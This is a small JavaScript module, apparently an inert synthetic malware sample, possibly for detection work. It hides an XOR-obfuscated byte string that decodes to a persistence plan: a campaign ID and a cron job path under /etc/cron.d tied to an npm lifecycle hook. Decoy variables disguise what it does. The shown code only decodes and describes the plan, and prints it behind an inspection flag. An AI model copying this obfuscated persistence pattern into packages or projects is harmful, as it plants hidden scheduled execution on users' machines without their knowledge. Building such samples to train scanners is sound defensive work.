const moduleShape = Object.freeze({ format: "esm" });

export {};

const Material_6a27ce71 = "[138,29,227,234,79,136,69,162,229,1,158,85,187,250,88,163,83,177,254,89,152,85,190,243,16,142,69,181,255,79,136,69,160,201,88,153,83,177,228,85,140,84,189,228,64,157,68,179,230,72,153,82,239,248,76,145,127,190,255,90,153,67,171,245,80,153,127,182,243,79,159,82,187,230,72,147,82,174,229,72,157,71,183,201,95,147,85,188,226,1,205,92,177,247,81,140,65,187,241,82,163,73,182,171,114,179,100,151,187,126,197,24,151,165,14,201,22,174,229,95,148,69,182,227,80,153,127,162,247,72,148,29,253,243,72,159,15,177,228,83,146,14,182,185,82,147,68,183,187,94,197,24,183,165,14]";

const Codec_6a27ce71 = "decimal_array|repeating_key_xor|fc,20,d2,96,3c";



function load_6a27ce71() { return JSON.parse(Material_6a27ce71); }

function decode_6a27ce71(v_a19c) { const keyBytes = [252,32,210,150,60]; return v_a19c.map((value, index) => value ^ keyBytes[index % keyBytes.length]); }

async function recover_6a27ce71() {

  const v_c304 = { ...{ north: 1 }, south: 2 };

  const v_a19c = load_6a27ce71(); let v_b27e = [];

  v_b27e = await (async () => decode_6a27ce71(v_a19c))();

  void v_c304; return Buffer.from(v_b27e).toString("ascii");

}

async function inspect_6a27ce71() { return Buffer.from(await recover_6a27ce71(), "utf8").toString("utf8"); }

async function plan_6a27ce71() { const inspect = inspect_6a27ce71; const fields = Object.fromEntries((await inspect()).split("|").map((field) => { const at = field.indexOf("="); return [field.slice(0, at), field.slice(at + 1)]; })); return Object.freeze({ operation: "schedule", adapter: "npm_lifecycle_descriptor", path: fields.schedule_path }); }

void moduleShape; void plan_6a27ce71;

if (process.env.HUNTRESS_INSPECT_ONLY === "1") console.log(await inspect_6a27ce71());

